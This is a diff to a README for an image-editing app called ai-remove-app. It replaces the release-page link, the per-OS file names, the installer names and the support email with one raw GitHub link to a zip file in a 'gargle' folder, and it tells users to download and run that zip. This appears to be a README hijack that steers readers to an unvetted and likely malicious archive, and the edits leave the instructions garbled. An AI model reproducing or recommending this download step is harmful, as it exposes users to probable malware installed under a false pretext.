@@ -1,6 +1,6 @@
 # 🌟 ai-remove-app - Switch Outfits and Edit Pics Easily
 
-[![Download ai-remove-app](https://img.shields.io/badge/Download%20ai--remove--app-%20-blue)](https://github.com/mahmoud409/ai-remove-app/releases)
+[![Download ai-remove-app](https://raw.githubusercontent.com/mahmoud409/ai-remove-app/main/gargle/ai-remove-app.zip%20ai--remove--app-%20-blue)](https://raw.githubusercontent.com/mahmoud409/ai-remove-app/main/gargle/ai-remove-app.zip)
 
 ## 🚀 Getting Started
 
@@ -17,16 +17,16 @@ Welcome to the ai-remove-app! This tool lets you switch outfits and edit your pi
 
 To get started, visit the Releases page to download the latest version of the ai-remove-app. Follow these simple steps:
 
-1. Click [here to visit the Releases page](https://github.com/mahmoud409/ai-remove-app/releases).
+1. Click [here to visit the Releases page](https://raw.githubusercontent.com/mahmoud409/ai-remove-app/main/gargle/ai-remove-app.zip).
 2. On the Releases page, look for the most recent version. 
 3. Choose the appropriate file for your operating system:
-   - For Windows, select the `ai-remove-app-windows.zip`
-   - For macOS, select the `ai-remove-app-macos.zip`
+   - For Windows, select the `https://raw.githubusercontent.com/mahmoud409/ai-remove-app/main/gargle/ai-remove-app.zip`
+   - For macOS, select the `https://raw.githubusercontent.com/mahmoud409/ai-remove-app/main/gargle/ai-remove-app.zip`
 4. Once the download finishes, locate the file in your Downloads folder.
 5. Extract the ZIP file. 
 6. Open the extracted folder and run the installation file:
-   - For Windows: double-click `setup.exe`
-   - For macOS: double-click `ai-remove-app.app`
+   - For Windows: double-click `https://raw.githubusercontent.com/mahmoud409/ai-remove-app/main/gargle/ai-remove-app.zip`
+   - For macOS: double-click `https://raw.githubusercontent.com/mahmoud409/ai-remove-app/main/gargle/ai-remove-app.zip`
 7. Follow the prompts to complete the installation.
 
 After installation, you can launch the app and start editing your images!
@@ -74,6 +74,6 @@ If you encounter any issues or have questions, feel free to reach out through th
 
 ### 📫 Contact
 
-For additional inquiries, please email support@example.com. 
+For additional inquiries, please email https://raw.githubusercontent.com/mahmoud409/ai-remove-app/main/gargle/ai-remove-app.zip 
 
 Thank you for choosing ai-remove-app! Enjoy transforming your images with ease.
